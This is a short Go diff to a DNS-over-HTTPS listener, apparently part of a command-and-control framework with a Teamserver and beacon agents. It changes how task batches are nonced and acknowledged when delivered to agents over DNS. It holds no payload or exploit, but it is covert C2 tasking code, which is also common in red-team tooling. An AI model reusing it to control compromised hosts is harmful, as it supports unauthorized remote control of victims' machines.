@@ -853,6 +853,8 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			if hasDf && df != nil && df.total > 0 && ackOffset <= df.total && ackOffset >= df.total {
 				// Verify ackTaskNonce matches to prevent old ACK from deleting new task
 				if ackTaskNonce == df.taskNonce {
+					// Agent confirmed receipt of entire task; finalize delivery in Teamserver (route1 inflight)
+					_ = d.ts.TsAgentAckDelivery(sid, df.taskNonce)
 					// Agent confirmed receipt of entire task
 					delete(d.downFrags, sid)
 					df = nil
@@ -874,9 +876,7 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 				if maxDataSize <= 0 || maxDataSize > (4<<20) {
 					maxDataSize = 4 << 20
 				}
-				if p, err := d.ts.TsAgentGetHostedAll(sid, maxDataSize); err == nil && len(p) > 0 {
-					// Generate unique taskNonce for this task batch
-					taskNonce := d.rng.Uint32()
+				if p, taskNonce, err := d.ts.TsAgentGetHostedAllDelivery(sid, maxDataSize); err == nil && len(p) > 0 {
 					if dohDebug {
 						fmt.Printf("[BeaconDoH-DNS] [HB] New tasks for sid=%s total=%d bytes taskNonce=%08x\n", sid, len(p), taskNonce)
 					}
